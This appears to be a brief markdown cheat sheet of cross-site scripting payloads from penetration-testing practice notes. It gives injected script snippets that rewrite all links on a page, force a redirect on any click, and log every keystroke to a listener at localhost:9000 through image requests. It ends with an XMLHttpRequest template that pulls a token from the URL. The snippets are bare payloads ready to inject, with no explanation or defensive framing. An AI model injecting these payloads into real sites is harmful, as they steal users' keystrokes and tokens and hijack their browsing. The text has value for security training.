## href change
```js
<script>for(let i of document.getElementsByTagName("a"))i.href="http://localhost"</script>
```


## event
``` js
<script>document.body.addEventListener('click',event=>{location.href="http://PentesterAcademy.com"});</script>
```
## keylogger
```js
<script>window.addEventListener("keydown",event=>{new Image().src="http://localhost:9000/?kedown="+event.key;})</script>
```

## XMLHttpRequest
```js
var xhr = new  XMLHttpRequest();
xhr.onreadystatechange=function(){
 if(xhr.readyState==4 && xhr.status==200){
  something;
 }

};

var token = window.location.search.split('&')[1];
xhr.open("GET","url",true);
xhr.send();

```
